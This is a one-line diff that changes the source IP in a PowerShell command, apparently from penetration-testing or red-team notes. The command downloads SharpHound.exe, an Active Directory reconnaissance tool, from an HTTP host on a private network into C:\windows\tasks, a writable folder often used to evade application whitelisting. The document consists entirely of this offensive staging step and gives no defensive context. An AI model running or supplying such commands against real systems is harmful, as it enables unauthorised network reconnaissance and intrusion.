@@ -1,1 +1,1 @@
-powershell -c "iwr -Uri 'http://10.2.2.153/tools/SharpHound.exe' -OutFile 'c:\windows\tasks\sharphound.exe' -TimeoutSec 300"
+powershell -c "iwr -Uri 'http://10.0.0.1/tools/SharpHound.exe' -OutFile 'c:\windows\tasks\sharphound.exe' -TimeoutSec 300"
